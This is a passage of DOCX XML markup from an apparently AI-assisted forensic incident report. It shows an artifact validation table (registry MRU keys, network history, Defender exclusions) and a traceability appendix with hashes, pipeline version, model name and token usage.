              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:19:53.882523</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:23:54.319485</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Network history</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-09 19:00:26.000938</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:07:13.000338</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: LastVisitedPidlMRU</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2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556811</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: CIDSizeMRU</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2023-11-10 11:13:56.588067</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.588067</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Defender (exclusions)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247112</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:52:49.247112</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: portable devices (WPD)</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2023-11-10 10:45:49.033342</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 10:45:49.033342</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>MRU LastVisited (Dissect)</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1417"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Dissect</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1134"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>validated</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1020"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556810</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 11:13:56.556810</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2835"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>Registry: WordWheelQuery (Explorer searches)</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2023-11-10 12:27:19.400274</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="14"/>
              </w:rPr>
              <w:t>2023-11-10 12:27:19.400274</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix F: Traceability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DuckDB database</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test01\db\case.duckdb</w:t>
              <w:br/>
              <w:t>SHA-256 43e2c1c47047027b87c8125a010937400335c8670635bca03cfc40a1c0829075</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Pipeline version</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>commit 364268ea83a1; content sha256 B14AD179924B89A9; deployed 2026-10-19 16:59</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Collection integrity</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>INTACT: 1569 file(s) matching the SHA-1 recorded by KAPE, 0 different, 0 missing, 0 without KAPE hash, 1 expected difference(s) on files copied live in raw mode (checked on 2026-10-19T17:09:59+02:00)</w:t>
              <w:br/>
              <w:t>Expected differences (raw live copy: $MFT, $LogFile...): C:\$LogFile</w:t>
              <w:br/>
              <w:t>After parsing: no collection file modified by parsing</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Normalization mappings</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>v2.0 sha256 827ddb5b0a51a48f611f7205d26c6fb1dc1b7e3f15de6f180daba4f96b02ad28</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Model</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>anthropic / claude-opus-5-5</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Agent runs</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2026-10-19T15:42:35Z → 2026-10-19T16:04:32Z: anthropic/claude-opus-5-5, playbook sha256 d51a2f0361dc1cd2…</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Usage</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>8,994,893 input tokens (of which 8,381,872 read from cache), 123,980 output tokens, 153 calls</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Full trace</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test01\analysis\transcript.jsonl: every SQL query, result and model answer</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Analysis state</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>C:\Sleuthline\cases\test01\analysis\findings.json</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Exports</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>iocs.csv, key_timeline.csv, incident_timeline.csv</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Reference format</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>&lt;output relative to parsed&gt;#&lt;record number&gt;: CSV data line (header excluded) or JSONL line</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2551"/>
            <w:shd w:val="clear" w:color="auto" w:fill="D9E2F3"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>Report generated on</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="7087"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t>2026-10-19 16:04 UTC</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